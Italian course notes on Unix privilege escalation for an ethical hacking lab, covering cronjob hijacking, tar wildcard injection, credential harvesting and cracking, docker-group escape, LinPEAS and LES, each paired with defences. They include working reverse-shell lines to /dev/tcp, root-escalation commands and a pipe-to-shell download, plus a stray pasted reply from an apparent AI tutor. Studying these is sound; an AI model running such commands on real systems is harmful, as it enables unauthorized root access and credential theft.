# ETHL 0x06 — Hacking Unix p2

> [!abstract] In una frase 
> Seconda parte della privilege escalation su Unix. Tre fronti nuovi: **abusare di cronjob** che girano come root (script scrivibili, PATH insicuro, wildcard), **raccogliere credenziali** già presenti sul sistema (config, history, chiavi, core dump) e **crackarle** ([[john_the_ripper]]/[[Hashcat]]), e **automatizzare** il recon con **LinPEAS** e **LES**. Continua il filo di [[ETHL 0x05 — Hacking Unix p1]]: trovare qualcosa che gira con più privilegi di te, e dirottarlo.

> [!tip] Come usare questa nota 
> Per ogni tecnica: _cosa fa → perché funziona → come ci si difende_. I payload sono riferimento da saper commentare. La domanda chiave del lab è il **wildcard injection** (Method 3) e il **docker group** — sono in [[#Trappole d'esame]]. Le reverse shell `bash -i >& /dev/tcp/...` le hai già spiegate in [[ETHL 0x02 — Remote Access - Shells]].

vedere [[linux-privesc lab]] per la parte pratica di questo lab

---
## 1. Exploiting cronjobs

### 1.1 Cos'è [[Cron]]

**Cron** è lo scheduler di task sui sistemi Unix: esegue comandi **periodicamente** secondo espressioni nei file **crontab**.

**Cron** è semplicemente un **servizio del sistema operativo** (daemon) che:

1. Legge un file (crontab) che contiene "cosa eseguire e quando"
2. Esegue quei comandi automaticamente agli orari specificati
3. Non ha bisogno che tu sia loggato — gira in background sempre

Esempi di cose che cron fa di solito:

- Backup notturni delle basi dati
- Pulizia di file temporanei
- Rotazione dei log
- Sincronizzazione di dati

### La sintassi crontab (semplificata)

```
m  h  dom mon dow   command
│  │  │   │   │     └─ cosa eseguire
│  │  │   │   └────── giorno della settimana (0=domenica, 1=lunedì, ... 6=sabato)
│  │  │   └────────── mese (1-12)
│  │  └────────────── giorno del mese (1-31)
│  └───────────────── ora (0-23)
└──────────────────── minuto (0-59)
```

**Esempi concreti**:

```bash
# Ogni giorno alle 3 di notte (minuto 0, ora 3)
0 3 * * *  /usr/local/bin/backup.sh

# Ogni lunedì (dow=1) alle 9:30
30 9 * * 1  /usr/bin/updatedb

# Ogni primo del mese alle 00:00
0 0 1 * *  /opt/scripts/monthlyreset.sh

# Ogni 5 minuti (*/5 significa "ogni 5")
*/5 * * * *  /usr/bin/healthcheck.sh
```

### Dove si mettono i cronjob

Ci sono due posti:

### 1. Crontab personale di un utente

```bash
crontab -e              # edita il crontab dell'utente corrente
crontab -l              # mostra il crontab dell'utente corrente
```

Quando lo editi, è **senza il campo "user"**:

```
# nel mio file crontab (sono utente 'mario')
0 3 * * *  /usr/local/bin/mio_backup.sh
```

Questo cronjob girerà **come mario** (perché è il suo crontab personale).

### 2. Crontab di sistema

```bash
cat /etc/crontab
```

Questo file **ha il campo "user"** esplicito:

```
# nel file /etc/crontab (gestito da root, legge tutti gli utenti)
0 3 * * *  root   /usr/local/bin/backup.sh
0 5 * * *  www-data  /var/www/cleanup.sh
30 9 * * 1 postgres  /opt/db_sync.sh
```

Cron esegue ogni riga **con l'utente specificato in quel campo**. Nel primo caso, come root; nel secondo, come www-data; nel terzo, come postgres.

Inoltre:

```bash
ls -la /etc/cron.d/     # frammenti aggiuntivi di cronjob di sistema
```

### Perché cron è un bersaglio — il punto critico

Immagina questo scenario reale:

```
# Nel file /etc/crontab
0 3 * * *  root  /usr/local/bin/backup.sh
```

Ogni notte alle 3:00, il sistema esegue `backup.sh` **come root** (uid=0).

Se tu (un utente non privilegiato) riuscissi a **modificare** il file `/usr/local/bin/backup.sh` e metterci una reverse shell, allora:

```
Minuto 59:59 → sei non privilegiato
Minuto 00:00 (ore 3) → cron esegue backup.sh come ROOT
Minuto 00:01 → ricevi una shell come ROOT
```

Quindi: **trovare un cronjob scrivibile che gira come root = trovare una strada per diventare root**.

### Scenario pratico — Test manuale

Prova questo sul tuo laboratorio:

```bash
# 1. Come utente normale, crea un cronjob che gira ogni minuto
crontab -e
# aggiungi questa riga:
* * * * * echo "ciao" >> /tmp/cron_test.txt
# salva e esci

# 2. Aspetta un minuto
sleep 65

# 3. Verifica
cat /tmp/cron_test.txt
# dovresti vedere "ciao" aggiunto ogni minuto
```

Questa è la meccanica di base: cron **esegue comandi periodicamente, come l'utente specificato**.

### La domanda che porta ai 3 metodi

Ora la domanda dell'attaccante è: **come faccio a modificare ciò che il cron esegue, se non ho i privilegi diretti?**

Tre risposte (tre metodi):

1. **Method 1**: Lo script cron è **scrivibile da me** → lo riscrivo direttamente
2. **Method 2**: Lo script cron ha un **percorso relativo** e il PATH è controllabile → metto un mio script omonimo prima nel PATH
3. **Method 3**: Lo script cron usa una **wildcard** e io posso creare **file con nomi speciali** che la shell interpreta come opzioni → comando eseguito diversamente

### Breve riassunto introduttivo di cron

```bash
crontab -l                 # cronjob dell'utente corrente
cat /etc/crontab           # crontab di sistema (ha il campo "user"!)
ls -la /etc/cron.d/        # frammenti crontab aggiuntivi
```

Sintassi di una riga crontab:

```
# m  h  dom mon dow  user   command
  0  5  *   *   1     root   tar -zcf /var/backups/home.tgz /home/
# │  │  │   │   └ giorno settimana (0-7)
# │  │  │   └──── mese
# │  │  └──────── giorno del mese
# │  └─────────── ora
# └────────────── minuto
```

> [!info] Perché cron è un bersaglio — punto chiave I cronjob fanno spesso **manutenzione di servizi** (cleanup, backup, rotazione sessioni) e per questo **girano come root**. Se riesci a manomettere **cosa** un cronjob esegue, **esegui comandi come root** al prossimo trigger. Esempio reale `/etc/cron.d/php`:
> 
> ```
> 09,39 * * * * root [ -x /usr/lib/php/sessionclean ] && ... /usr/lib/php/sessionclean
> ```
> 
> Il campo `root` dice con quali privilegi gira. Questo è ciò che vuoi dirottare.

Vedremo **3 metodi** per manometterlo.

### 1.2 Method 1 — Script cron scrivibile

Lo scenario: `overwrite.sh` è eseguito da root ogni minuto, ed è **world-writable**:

```
-rwxr--rw- 1 root staff 40 ... /usr/local/bin/overwrite.sh
#       ^^ chiunque può scrivere
```

**Exploit** — riscrivi lo script con una reverse shell:

```bash
# 1. listener sull'attaccante (qui stessa macchina, 127.0.0.1)
nc -lp 8888
# 2. sovrascrivi overwrite.sh
echo 'bash -i >& /dev/tcp/127.0.0.1/8888 0>&1' > /usr/local/bin/overwrite.sh
# 3. aspetta il prossimo minuto
```

> [!success] Perché funziona Il cron esegue `overwrite.sh` **come root**. Avendolo riscritto con una reverse shell, quella shell parte con UID=0. In media dopo 30s ottieni `root@debian`. PE completa. **Difesa**: i file eseguiti da cron root non devono essere scrivibili da utenti non privilegiati (permessi `755 root:root`, mai gruppo/altri in write).

### 1.3 Method 2 — PATH del crontab insicuro

Lo scenario: il crontab definisce un `PATH` e chiama lo script con **percorso relativo**:

```
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root overwrite.sh        ← path RELATIVO, non /usr/local/bin/overwrite.sh
```

> [!info] Il meccanismo Con percorso relativo, `/bin/sh` cerca `overwrite.sh` in **ogni directory del PATH, in ordine**. Se puoi scrivere in una directory che viene **prima** di quella legittima (qui `/home/user` è la prima!), metti lì un tuo `overwrite.sh` e cron eseguirà il **tuo** invece dell'originale.

**Exploit**:

```bash
nc -lp 7777
cat > /home/user/overwrite.sh <<'EOF'
#!/bin/sh
bash -i >& /dev/tcp/127.0.0.1/7777 0>&1
EOF
chmod +x /home/user/overwrite.sh
# aspetta il cron
```

> [!success] Difesa Nei crontab usare **sempre percorsi assoluti** (`/usr/local/bin/overwrite.sh`) e un `PATH` minimale che non includa directory scrivibili dagli utenti. Stesso identico problema del PATH relativo nei SUID visto in [[ETHL 0x05 — Hacking Unix p1]].

### 1.4 Method 3 — Wildcard injection (insecure scripts) ⭐

Lo scenario: un cronjob root esegue uno script che usa una **wildcard `*`**:

```sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *      ← la * viene espansa dalla SHELL
```

> [!danger] Il meccanismo — punto d'esame centrale La **shell espande `*`** nella lista dei file della directory **prima** di passarli a `tar`. I nomi dei file diventano argomenti sulla riga di comando. Se tu crei file i cui **nomi sembrano opzioni** di `tar`, `tar` li interpreterà come **opzioni**, non come dati.
> 
> Da **[[GTFOBins]]** si scopre che `tar` ha una feature **checkpoint** che può eseguire comandi:
> 
> - `--checkpoint=1` → esegui l'azione ogni 1 record
> - `--checkpoint-action=exec=<script>` → esegui `<script>` al checkpoint

**Exploit**:

```bash
nc -lp 9999
# 1. script con la reverse shell
cat > /home/user/myshell.sh <<'EOF'
#!/bin/sh
bash -i >& /dev/tcp/127.0.0.1/9999 0>&1
EOF
chmod +x /home/user/myshell.sh
# 2. file con nomi che mimano opzioni di tar
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=myshell.sh
# 3. aspetta il cron
```

Quando il cron gira, dopo l'espansione della `*` il comando eseguito diventa:

```
tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=myshell.sh myshell.sh tools
#                          └─────── i tuoi file letti come OPZIONI ───────┘ └─ file reali ─┘
```

→ `tar` esegue `myshell.sh` come root → shell root.

> [!info] Pattern generale — NON è un bug di tar Questo è un pattern di **uso insicuro delle wildcard**, non specifico di `tar` né dei cronjob:
> 
> 1. un tool usa wildcard non quotate / espansione di input non sicura
> 2. l'attaccante piazza file con nomi che **mimano opzioni CLI**
> 3. in esecuzione il nome-file è interpretato come **opzione reale, non come dato**
> 
> Se il processo gira con privilegi elevati → RCE / PE. È lo stesso peccato di [[ETHL 0x04 — Web Security p2]]: **confusione tra dati e codice** (qui: tra "nome di file-dato" e "opzione-comando"). **Difesa**: quotare le variabili, usare `./` davanti alle wildcard (`tar ... -- *` o `./` glob) così i nomi non partono con `-`, o `--` per terminare le opzioni.

> [!todo] Hands-on (slide 19) Practical 0x07 level 1 e 2 — `linux-privesc` (ambiente Docker). Applica i 3 metodi. https://github.com/5ud0ch0p/linux-privesc

---

## 2. Passwords and keys

Avere un foothold = poter **raccogliere più dettagli** dal sistema. Tre sorgenti: file di configurazione, shell history, chiavi.

### 2.1 File di configurazione

Se hai bucato un server, stai impersonando l'utente del servizio. I **file di config dell'app** spesso contengono password (es. password del DB).

> [!example] Scenario tipico 
> Buchi una web app → leggi la **password del DB** dai file di config → accedi al database (data exfiltration) → raccogli utenti e password dell'applicazione.

> [!info] Perché conta — il riuso delle password Gli umani **riusano le password**. Quindi:
> 
> ```bash
> cat /etc/passwd          # enumera gli utenti locali
> su - <user>              # prova le password raccolte
> ```
> 
> Una password trovata in un config può aprire l'account di un altro utente ([[Lateral Movement]]) o di root. È il punto (1) di [[ETHL 0x05 — Hacking Unix p1]]: "informazioni raccolte con l'accesso iniziale".

> [!example] Scenario realistico — VPN
> 
> ```
> cat myvpn.ovpn          → auth-user-pass /etc/openvpn/auth.txt
> cat /etc/openvpn/auth.txt
> root
> password123             ← credenziali in chiaro
> ```

#### Passo 1: Leggi il file .ovpn

```bash
cat myvpn.ovpn
```

Output:

```
client
remote vpn.company.com 1194 udp
auth-user-pass /etc/openvpn/auth.txt
cipher AES-256-CBC
...
```

**Cosa impari da questo**: "Per connettersi a questa VPN, usa le credenziali che sono nel file `/etc/openvpn/auth.txt`".

#### Passo 2: Leggi il file delle credenziali

```bash
cat /etc/openvpn/auth.txt
```

Output:

```
vpn_admin
password123
```

**Cosa ottieni**: le credenziali **in chiaro** per accedere a quella VPN.

---

#### La risposta alle tue due domande

> **Domanda 1**: "Prendendo il contenuto di .ovpn ho il via libera nella rete privata?"

**NO**. Il `.ovpn` da solo **non ti dà accesso**. Ti dice solo **dove trovare** le credenziali. Non contiene le password — è un riferimento a un altro file.

> **Domanda 2**: "Facendo cat /etc/openvpn/auth.txt posso ottenere la coppia utente password?"

**SÌ**, esattamente questo. Lì dentro sono le credenziali **in chiaro**.

---

#### Cosa fai con quelle credenziali (il valore dell'attacco)

Una volta che hai `vpn_admin / password123`:

#### Scenario A: Usi la VPN da quella stessa macchina

```bash
# Sulla macchina compromessa, connettiti alla VPN
openvpn myvpn.ovpn
# → entri nella rete privata come vpn_admin
# → puoi scannerizzare/attaccare altri servizi interni
```

#### Scenario B: Usi le credenziali su altri sistemi (riuso)

```bash
# Su una macchina diversa (tua, attacker)
# Accedi a un altro servizio che riusa quelle credenziali:
ssh vpn_admin@internal-server.local
# password: password123 ✓ funziona!

# O su un servizio di management interno
curl -u vpn_admin:password123 http://internal-admin.local/api
```

Questo è il punto cruciale di [[ETHL 0x06 — Hacking Unix p2]] **§ 2.1**: gli umani **riusano le password**. Se trovi `vpn_admin:password123` nel config di una VPN, è probabile che:

- Funziona anche su SSH di altri server interni
- Funziona sul database interno
- Funziona sul servizio di admin

---

#### Riassunto dell'attacco

```
Comprometto una macchina (www-data su web server)
    ↓
Leggo /var/www/config/vpn.conf → vedo "auth-user-pass /etc/openvpn/auth.txt"
    ↓
Leggo /etc/openvpn/auth.txt → ottengo vpn_admin / password123
    ↓
Provo quelle credenziali su SSH interno → funzionano!
    ↓
Sono dentro la rete privata come vpn_admin → PE/lateral movement completata
```

**Il .ovpn da solo non è niente**, è una **mappa** che ti dice dove cercare. Le credenziali **vere** sono in `/etc/openvpn/auth.txt`.


### 2.2 Crackare le password

Se trovi **hash** invece di password in chiaro:

- **Rainbow tables** → utili solo se l'hash è **senza salt** (hash precalcolati).
- Le app fatte bene usano **salt** + algoritmi robusti (**Argon2**, **Bcrypt**) → le rainbow table non bastano, servono **wordlist** con tool di cracking.

|Tool|Caratteristica|
|---|---|
|**John the Ripper**|multipurpose, riconosce molti formati|
|**hashcat**|velocissimo, ottimizzato per **GPU**|

```bash
# John con wordlist
john --format=crypt --wordlist=/usr/share/seclists/Passwords/darkweb2017-top10000.txt hashes.txt

# hashcat (es. SHA-256 = mode 1400)
hashcat -a0 -m1400 sha256-hashes.txt rockyou.txt
```

> [!info] Perché il salt cambia la strategia Il **salt** rende ogni hash unico anche per password identiche → le rainbow table (tabelle precalcolate) diventano inutili, perché dovresti precalcolare una tabella per ogni salt. Resta il **brute-force/wordlist**: provi password candidate, le hashi col salt giusto, confronti. Più lento ma funziona. Per questo si crackano password **un hash alla volta** quando c'è salt.

### 2.3 Shell history

Se l'utente del servizio (o un utente a cui sei arrivato lateralmente) ha avuto sessioni interattive, la history può rivelare password e operazioni utili:

```bash
cat ~/.*history        # .bash_history, .zsh_history, ...
```

```
mysql -h somehost.local -uroot -ppassword123    ← password in chiaro nella history!
nano myvpn.ovpn
```

> [!warning] Perché succede Comandi come `mysql -p<password>` o `curl -u user:pass` finiscono **in chiaro nella history**. È un classico: la difesa è non passare segreti come argomenti CLI (usare prompt o file con permessi stretti) e svuotare la history dopo operazioni sensibili.

### 2.4 Chiavi e materiale di autenticazione

Per scalare o muoversi lateralmente, raccogli **chiavi**:

- **SSH keys** (`~/.ssh/id_*`) → log in su altri sistemi
- **GPG keys** → es. social engineering

Le chiavi SSH private possono essere **protette da passphrase** → si cracca anche quella:

```bash
# converti la chiave in formato crackabile, poi John
/usr/share/john/ssh2john.py ~/.ssh/mykey > mykey.john
john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt mykey.john
```

### 2.5 Core dump — sorgente sottovalutata

> [!info] Come funziona — frequente in post-exploitation reale Un processo privilegiato (es. root) **crasha** e genera un **core dump**: uno snapshot della memoria del processo, che può contenere:
> 
> - variabili d'ambiente (token, API key…)
> - contenuto di stack e heap
> - file descriptor aperti
> - **credenziali in chiaro**
> 
> Se il dump finisce in una posizione leggibile dall'attaccante (`/core`, `/var/crash/`), un utente non privilegiato lo legge ed estrae i segreti. È un leak di memoria privilegiata su disco.

> [!todo] Hands-on (slide 34) Practical 0x02 level 3 — `linux-privesc`.

---

## 3. LinPEAS

> [!abstract] LinPEAS = Linux Privilege Escalation Awesome Script 
> Script che cerca automaticamente possibili **percorsi di privilege escalation** su host Unix (non solo Linux). I check sono spiegati su `book.hacktricks.xyz`. **Nessuna dipendenza** (gira ovunque).

> [!warning] È rumoroso 
> LinPEAS è **rumoroso, lascia tracce ed è facilmente rilevato dagli EDR** (Endpoint Detection and Response). Va bene nei CTF/lab, rischioso in engagement reali stealth.

```bash
./linpeas.sh         # scansione standard
./linpeas.sh -a      # extra checks (CTF): cerca più hash nei file,
                     # brute-force di ogni utente con su + top2000 password
```

**Legenda colori** (da saper leggere):

| Colore           | Significato                                                     |
| ---------------- | --------------------------------------------------------------- |
| **Rosso/Giallo** | 95% un vettore di PE                                            |
| **Rosso**        | da guardare                                                     |
| Verde            | cose comuni (utenti, gruppi, SUID/SGID, mount, script, cronjob) |
| LightMagenta     | il tuo username                                                 |

> [!example] Esempio d'esame — il gruppo docker come vettore di PE 
>![[Pasted image 20260614200543.png]] ![[Pasted image 20260614200632.png]]
> LinPEAS evidenzia che l'utente è nel gruppo **`docker`**. Perché è un vettore?
> 
> ```bash
> docker run -it -v /:/host/ bash:latest bash    # monta tutto il filesystem host
> chroot /host bash                              # → root sull'host
> # id → uid=0(root)
> ```
> 
> L'utente è **non privilegiato**, ma essere nel gruppo `docker` gli permette di **avviare un container come root e montarci il filesystem dell'host** → accede all'host come root. È un Confused Deputy: il daemon Docker (root) esegue azioni per conto di un utente che non dovrebbe avere quel potere. **Difesa**: il gruppo `docker` equivale a root — non darlo a utenti non fidati.
> **Perché di default è root:** il binario `docker` non ha permessi propri — parla con il **socket** `/var/run/docker.sock`, che è posseduto da `root:docker` con permessi `srw-rw----`. Chiunque possa scrivere su quel socket può chiedere al **daemon** (che gira come root, senza ulteriori controlli di autorizzazione) di fare qualsiasi cosa: creare container, montare volumi, eseguire con `--privileged`, ecc. Il daemon non fa distinzioni granulari — "puoi parlarmi" equivale a "puoi fare tutto ciò che io (root) posso fare". È per questo che appartenere al gruppo `docker` è descritto come "equivalente a root": **non è un permesso intermedio, è una porta diretta verso un processo root senza ACL aggiuntive**.

Sì, è un po' generico — è essenzialmente il recap delle slide più un esempio (docker). Il problema per l'esame: così sai _descrivere_ LinPEAS, ma non hai allenato la cosa che conta davvero, cioè **leggere un output reale e isolare il vettore giusto in mezzo a centinaia di righe**.

(Nota: le due immagini incollate sono path locali di Obsidian, non le vedo da qui — se vuoi che commenti cosa mostrano, descrivimele o incollami il testo rilevante.)

Cosa aggiungerei per renderla più "esame-ready":

**1. Collegamento con i vettori già visti.** [[LinPEAS]] non è un argomento isolato — è lo strumento che _trova_ le cose delle note precedenti. Vale la pena scrivere esplicitamente: "lo script cron wildcard del Method 3 → LinPEAS lo segnala in [colore] con [testo]", "il SUID con PATH relativo di 0x05 → sezione SUID, evidenziato in rosso". Senza questo, LinPEAS resta uno strumento a sé, scollegato dal resto del corso.

**2. Checklist mentale di lettura.** Con output da migliaia di righe, serve un ordine: di solito si parte da `sudo -l`, poi SUID/SGID, capabilities, gruppi pericolosi (docker/lxd/disk), cron scrivibili, file con permessi anomali in `/etc`. La nota attuale dà solo la legenda colori, non l'ordine in cui guardare.

**3. Falsi positivi.** LinPEAS marca in rosso/giallo _molto_ — incluse cose non sfruttabili nel contesto specifico. Vale la pena una riga su "rosso ≠ exploit garantito, va verificato a mano" (è anche un punto che spesso chiedono per distinguere chi capisce lo strumento da chi lo usa a scatola chiusa).

**4. Trasferimento sul target** (manca del tutto): `python3 -m http.server` lato attaccante + `curl <ip>/linpeas.sh | sh` o `wget` lato target — è il passaggio pratico che la nota salta.


---

## 4. Linux Exploit Suggester (LES)

> [!abstract] LES Rileva carenze di sicurezza per uno specifico **kernel Linux**: valuta l'esposizione del kernel a **exploit pubblici noti** e verifica lo stato delle **misure di hardening**.

Per ogni exploit calcola l'esposizione: **Highly probable / Probable / Less probable / Improbable**.

```bash
./les.sh              # cerca exploit applicabili al kernel corrente
./les.sh --checksec   # stato delle protezioni del kernel (PTI, stack protector, ...)
```

![[Pasted image 20260614202237.png]]

> [!example] Output tipico
> 
> ```
> Kernel version: 6.6.9 / aarch64
> Possible Exploits:
> [+] [CVE-2022-2586] nft_object UAF — Exposure: less probable
> [+] [CVE-2021-22555] Netfilter heap out-of-bounds write
> ```
> 
> Mappa il kernel a CVE noti con probabilità di successo. Complementare a LinPEAS: LinPEAS cerca **misconfigurazioni** (SUID, cron, gruppi), LES cerca **vulnerabilità del kernel**.

> [!note] LinPEAS vs LES
> 
> - **LinPEAS** → misconfigurazioni e vettori di PE a livello di sistema/configurazione
> - **LES** → vulnerabilità del **kernel** sfruttabili (kernel exploit) 
>  
>Si usano insieme: prima le misconfig (più affidabili e silenziose), poi i kernel exploit (più rumorosi e rischiosi, possono crashare la macchina).

---

## 5. Trappole d'esame

> [!danger] Le domande "spiega questo / perché" tipiche del lab
> 
> 1. **Perché i cronjob sono un bersaglio?** → fanno manutenzione e girano spesso come **root**; manomettere ciò che eseguono = RCE come root.
> 2. **Method 1 (script scrivibile)** → riscrivi lo script eseguito da cron root con una reverse shell.
> 3. **Method 2 (PATH insicuro)** → percorso relativo + directory scrivibile **prima** nel PATH → metti il tuo script omonimo.
> 4. **Method 3 (wildcard injection)** → la **shell espande `*`** prima di passarla al comando; file con nomi che mimano opzioni (`--checkpoint-action=exec=...`) sono letti come **opzioni**, non dati. Non è un bug di tar; è uso insicuro delle wildcard.
> 5. **Difesa wildcard** → quotare le variabili, `--` per terminare le opzioni, `./*` così i nomi non iniziano con `-`.
> 6. **Perché si raccolgono password sul sistema?** → riuso delle password tra utenti/servizi → lateral movement e PE.
> 7. **Rainbow table vs wordlist cracking** → rainbow utili solo **senza salt**; con salt servono wordlist (provo, hasho col salt, confronto).
> 8. **Perché il salt vanifica le rainbow table?** → ogni hash è unico anche per password uguali → tabella precalcolata inutile.
> 9. **Shell history come leak** → password passate come argomenti CLI (`mysql -ppass`) finiscono in `.bash_history`.
> 10. **Core dump come leak** → snapshot di memoria di un processo root crashato in posizione leggibile → credenziali/token in chiaro.
> 11. **Gruppo docker = PE** → `docker run -v /:/host` monta l'host; chroot → root. Il gruppo docker equivale a root.
> 12. **LinPEAS è rumoroso** → lascia tracce, rilevato da EDR; legenda rosso/giallo = vettore al 95%.
> 13. **LinPEAS vs LES** → misconfigurazioni vs vulnerabilità del kernel.
> 14. **Confused Deputy ricorrente** → cron root, daemon docker: componente privilegiato dirottato (collega a [[ETHL 0x05 — Hacking Unix p1]]).

---

## 6. Tabella riassuntiva: vettore → come si abusa → difesa

|Vettore|Come si abusa|Difesa chiave|
|---|---|---|
|Cron script scrivibile|riscrivi con reverse shell|permessi `755 root:root`, no write a non-root|
|Cron PATH insicuro|script omonimo in dir scrivibile prima nel PATH|percorsi assoluti, PATH minimale|
|Cron wildcard (`*`)|file-nome che mima opzioni (tar checkpoint)|quotare, `--`, `./*`|
|Config con password|leggi DB/VPN cred → riuso su altri utenti|segreti fuori dai config, vault, permessi stretti|
|Shell history|`cat ~/.*history` → password CLI|no segreti in argomenti CLI, pulire history|
|Chiavi SSH/GPG|ruba `~/.ssh/id_*`, cracka passphrase|passphrase forti, permessi `600`, no chiavi condivise|
|Core dump|leggi `/core` `/var/crash` → memoria root|disabilitare core dump per servizi, permessi|
|Gruppo docker|`docker run -v /:/host` → root host|non assegnare il gruppo docker a non fidati|
|Kernel vulnerabile|kernel exploit (LES → CVE)|kernel aggiornato, hardening (PTI, KASLR)|

---

## 7. Richiamo attivo (a libro chiuso)

> [!question] Verifica
> 
> 1. Perché un cronjob è spesso un buon vettore di PE?
> 2. Descrivi i 3 metodi di exploitation dei cronjob in una frase ciascuno.
> 3. Spiega passo passo il wildcard injection con `tar` (cosa fa la shell, cosa fa tar, perché diventa RCE).
> 4. Perché il wildcard injection NON è un bug di `tar`? Come si difende lo script?
> 5. Perché si raccolgono le password degli utenti su un sistema bucato?
> 6. Quando le rainbow table sono inutili e cosa usi al loro posto?
> 7. Due posti dove trovi password "gratis" su un sistema (oltre ai config).
> 8. Cos'è un core dump e perché può essere un leak di sicurezza?
> 9. Spiega come essere nel gruppo `docker` porta a root sull'host.
> 10. Differenza tra LinPEAS e LES, e perché LinPEAS è rischioso in un engagement reale.

---

> [!quote] Filo conduttore Tutta la post-exploitation di questo lab è due idee: **(1)** dirottare qualcosa che gira con più privilegi di te (cron root, daemon docker) — il Confused Deputy di [[ETHL 0x05 — Hacking Unix p1]]; **(2)** raccogliere le credenziali che il sistema **già contiene** (config, history, chiavi, dump) e sfruttare il riuso umano delle password. Gli strumenti (LinPEAS, LES) automatizzano la ricerca di entrambe. La difesa è sempre **minimo privilegio + niente segreti in chiaro + niente input/percorsi/wildcard controllabili nei processi privilegiati**.